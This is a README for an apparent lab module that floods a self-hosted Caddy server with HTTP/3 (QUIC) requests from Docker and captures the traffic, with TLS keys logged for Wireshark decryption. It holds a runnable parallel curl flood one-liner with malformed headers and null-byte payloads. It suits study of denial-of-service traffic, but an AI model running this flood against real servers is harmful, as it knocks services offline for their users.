# HTTP3-Flood Attack

This module launches a high-volume HTTP/3 flooding attack using curl in a Docker container.
The goal is to overwhelm the server with a large number of QUIC packets.

---

## 🔧 Prerequisites

- Ensure the **Caddy server** is running with HTTP/3 support.  
  If not yet set up, refer to the root [`caddysetup`](../docs/CaddySetup.md) for installation and configuration instructions.

- Ensure Docker is installed on the attacker machine.
  Folder structure should include:
  - Dockerfile
  - http3-flood.sh (the attack script)
  - output/ directory (for captured PCAP and TLS keys)

- Modify the Attack Script (if needed)
  Open http3-flood.sh and modify the target URL depending on your setup:
  ```bash
     seq 1 10 | xargs -n1 -P10 timeout 1s curl --insecure -X GET https://<your-server-ip> -H "method: HEAD" -H "method: POST" -H "method: GET" -H "settings: 0" --data "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" --http3 -v -o /dev/null
  ```
  - You may also adjust the number of requests and parallel threads using seq and -P.

## ⚙️ Docker Setup and Execution

### 1. Build the Docker Image
```bash
docker build -t curl-http3 .
```
### 2. Run the Attack (and Capture)
```bash
docker run -it \
  --network host \
  --cap-add=NET_ADMIN \
  --cap-add=NET_RAW \
  -e SSLKEYLOGFILE=/tmp/sslkeys.log \
  -v $(pwd)/output:/tmp \
  curl-http3
```
- Inside the Docker container:
```bash
tcpdump -i any -w /tmp/attack.pcap &
bash /root/http3-flood.sh
```
  To stop recording:
```bash
pkill tcpdump
```

- Files will appear in output/ on the host machine:
  - attack.pcap
  - sslkeys.log

### 3. Decrypting QUIC Traffic with Wireshark
- 1. Open output/attack.pcap in Wireshark.

- 2. Go to:
        Edit → Preferences → Protocols → TLS

- 3. Set the log file path:
```bash
(Pre)-Master-Secret log filename: ./output/sslkeys.log
```
- 4. Apply changes and Wireshark will decrypt the HTTP/3 traffic.

## ✅ Optional:
Modify and run the included timer_script.sh in another terminal to monitor server response times during the attack

## 🚀 How to Run

```bash
cd ../../aioquic
./http3-loris/http3-loris.sh
```

